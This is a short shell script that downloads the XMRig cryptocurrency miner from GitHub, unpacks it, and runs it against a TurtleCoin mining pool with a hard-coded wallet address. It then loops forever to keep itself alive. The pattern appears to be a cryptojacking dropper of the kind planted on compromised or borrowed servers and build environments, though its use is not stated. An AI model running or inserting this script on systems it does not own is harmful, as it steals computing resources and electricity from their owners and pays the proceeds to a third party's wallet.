#!/bin/sh
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-static-x64.tar.gz
tar xf xmrig-6.16.1-linux-static-x64.tar.gz
cd xmrig-6.16.1
./xmrig -o de.turtlecoin.herominers.com:1160 -u TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps -p ajul -k -a argon2/chukwav2
while [ 1 ]; do
sleep 3
done
sleep 999
